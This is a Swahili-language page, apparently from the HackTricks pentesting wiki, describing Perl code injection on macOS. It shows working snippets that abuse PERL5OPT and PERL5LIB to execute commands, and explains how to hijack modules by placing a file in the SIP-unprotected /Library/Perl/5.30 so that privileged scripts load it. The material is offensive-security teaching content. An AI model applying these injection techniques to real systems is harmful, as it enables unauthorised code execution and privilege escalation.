# Uingizaji wa Maombi ya Perl kwenye macOS

{% hint style="success" %}
Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kupitia `PERL5OPT` & `PERL5LIB` env variable

Kwa kutumia mazingira ya kipekee ya PERL5OPT, inawezekana kufanya perl itekeleze amri za kupindukia.\
Kwa mfano, unda script hii:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Sasa **tengeneza mazingira ya env** na tekeleza skripti ya **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo lingine ni kuunda moduli ya Perl (k.m. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Na kisha tumia mazingira ya env:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Kupitia tegemezi

Inawezekana kuorodhesha folda za tegemezi kwa mpangilio wa Perl unapoendesha:
```bash
perl -e 'print join("\n", @INC)'
```
Ambayo itarudisha kitu kama:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorudishwa hazipo, hata hivyo, **`/Library/Perl/5.30`** ipo, haikilindwi na **SIP** na iko **kabla** ya folda zilizolindwa na SIP. Kwa hivyo, mtu anaweza kutumia folda hiyo kuongeza mahitaji ya script ili script ya Perl yenye mamlaka makubwa iweze kuijumuisha.

{% hint style="warning" %}
Hata hivyo, kumbuka kwamba **unahitaji kuwa na ruhusa ya msingi kuandika kwenye folda hiyo** na siku hizi utapata **ombi la TCC** hili:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Kwa mfano, ikiwa script inaingiza **`use File::Basename;`** ingewezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya iendeshe nambari ya kupendelea.

## Marejeo

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
